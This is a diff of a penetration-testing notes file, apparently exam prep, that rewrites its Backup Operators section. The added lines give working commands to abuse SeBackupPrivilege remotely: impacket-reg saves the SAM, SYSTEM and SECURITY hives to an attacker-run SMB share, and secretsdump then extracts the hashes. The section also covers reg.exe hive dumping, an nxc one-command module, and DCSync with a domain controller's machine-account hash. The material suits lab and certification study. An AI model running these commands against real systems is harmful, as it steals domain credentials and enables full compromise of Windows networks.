@@ -76,9 +76,18 @@ Get-Content -LiteralPath C:\Users\Public\proof.txt
 - General service abuse → [service permissions](../windows/service-permissions.md), [service binary hijacking](../windows/service-binary-hijacking.md).
 
 ## Backup Operators
-`SeBackupPrivilege` is checked **locally** — it only matters once code is already running on the box as that account. Membership alone gives no remote exec: SMB access doesn't run commands, and WMI/WinRM/RDP(`/pth`) each separately require admin-equivalent rights or group membership (`Remote Management Users`, Restricted Admin mode) that Backup Operators doesn't carry. Getting a shell to run `reg.exe` in the first place is the actual blocker, not the privilege itself.
+Membership gives no remote exec (WinRM/WMI/RDP need other rights), but the privilege works remotely over the registry RPC: save the hives to a Kali share.
+```bash
+mkdir -p /tmp/hives
+sudo impacket-smbserver -smb2support share /tmp/hives
+impacket-reg '<DOMAIN.TLD>/<USER>:<PW>@<IP>' backup -o '\\<KALI>\share'
+impacket-secretsdump -sam /tmp/hives/SAM.save -system /tmp/hives/SYSTEM.save -security /tmp/hives/SECURITY.save LOCAL
+```
+- `backup` = SAM + SYSTEM + SECURITY. The target must reach Kali on TCP/445.
+- On a DC: `$MACHINE.ACC` in the LSA output = DC machine-account hash → DCSync as `<HOSTNAME>$` with `-hashes :<NT>` ([credential-access](credential-access.md#dcsync-inspect-rights-and-select-the-account)).
+- Plain remote `secretsdump` (no hive files) needs admin; `reg.py` starts RemoteRegistry via its named pipe instead.
 
-This also closes the obvious workaround: plain remote `secretsdump.py` (no `-sam`/`-system`/`-security` files, i.e. live against the wire) always opens the Service Control Manager first (`RemoteOperations.enableRegistry()` → `__checkServiceStatus()` → `scmr.hROpenSCManagerW`, `impacket/examples/secretsdump.py`) — no flag skips that, so it needs admin too. There's no remote-secretsdump shortcut around the privilege; the local `reg.exe save` + offline `LOCAL` steps below are the actual path once you have a shell.
+With a shell as that account:
 ```cmd
 reg.exe save HKLM\SAM C:\Temp\sam.save
 reg.exe save HKLM\SYSTEM C:\Temp\system.save
@@ -89,11 +98,11 @@ impacket-secretsdump -sam sam.save -system system.save -security security.save L
 ```
 - On a DC the SAM holds only the local recovery account. Domain hashes → NTDS workflow in [credential-access](credential-access.md).
 
-No-shell-needed route (SMB access + the privilege only, no code execution on the box first):
+Same in one nxc module:
 ```bash
 nxc smb <IP> -u <USER> -p '<PW>' -M backup_operator
 ```
-- Writes the hives to a share the group can reach (SYSVOL), reads them back over SMB, then cleans up — privilege abuse, loot and cleanup in one command. That auto-exploit pattern is **not exam-safe** (check the current exam guide's tool restrictions: [exam-checklist](../documentation/exam-checklist.md)). The manual `reg.exe` + `LOCAL secretsdump` steps above are the exam-safe equivalent once you actually have a shell as that account.
+- Writes the hives to a share the group can reach (SYSVOL), reads them back over SMB, then cleans up — privilege abuse, loot and cleanup in one command. That auto-exploit pattern is **not exam-safe** (check the current exam guide's tool restrictions: [exam-checklist](../documentation/exam-checklist.md)). The manual `impacket-reg backup` + `LOCAL secretsdump` steps above are the step-by-step equivalent.
 
 ## Account Operators
 Works on non-protected accounts and groups only (`adminCount` can be stale: read the ACL). Look for a writable group that grants access somewhere.
